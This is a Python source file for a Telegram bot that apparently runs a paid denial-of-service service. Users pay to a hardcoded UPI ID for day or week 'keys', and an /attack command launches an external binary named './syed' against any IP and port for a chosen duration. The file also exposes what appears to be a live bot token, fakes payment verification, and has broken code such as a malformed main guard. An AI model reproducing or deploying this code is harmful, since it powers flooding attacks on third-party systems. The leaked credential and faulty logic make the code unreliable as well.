from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess
import datetime

TOKEN = '7716021318:AAFg6FyIBymPllIdzi6QnYq7VbYMnaB0CVM'
UPI_ID = 'eibad@slice'

# Temporary in-memory balance system
users = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to the bot!\nUse /Add to add balance.\nUse /buy to buy key.\nUse /attack to launch attack.")

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"Send payment to UPI ID: {UPI_ID}\nAfter payment, send /paid <amount> <transaction_id>"
    await update.message.reply_text(text)

async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        _, amount, txn_id = update.message.text.split()

        amount = int(amount)
        # Simulate verification (in real case, integrate with UPI gateway)
        if len(txn_id) > 5:
            users[user_id] = users.get(user_id, 0) + amount
            await update.message.reply_text(f"Payment verified. {amount} added. Your balance: {users[user_id]}")
        else:
            await update.message.reply_text("Invalid transaction ID.")
    except:
        await update.message.reply_text("Usage: /paid <amount> <txn_id>")

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    keyboard = [
        [InlineKeyboardButton("1 Day Key - 50", callback_data='1day')],
        [InlineKeyboardButton("1 Week Key - 250", callback_data='1week')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Choose key to buy:', reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == '1day':
        cost = 50
        duration = '1 Day'
    elif data == '1week':
        cost = 250
        duration = '1 Week'

    if users.get(user_id, 0) >= cost:
        users[user_id] -= cost
        await query.edit_message_text(f"{duration} key purchased! Balance: {users[user_id]}")
    else:
        await query.edit_message_text("Insufficient balance.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        _, ip, port, duration = update.message.text.split()
        duration = int(duration)

        await update.message.reply_text(f"Attack started on {ip}:{port} for {duration} seconds.")
        subprocess.Popen(['./syed', ip, port, str(duration)])
        
        # Schedule a message after attack duration
        await asyncio.sleep(duration)
        await update.message.reply_text("Attack ended.")
    except:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")

if name == 'main':
    import asyncio

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("Add", add))
    app.add_handler(CommandHandler("paid", paid))
    app.add_handler(CommandHandler("buy", buy))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(telegram.ext.CallbackQueryHandler(button))

    app.run_polling()
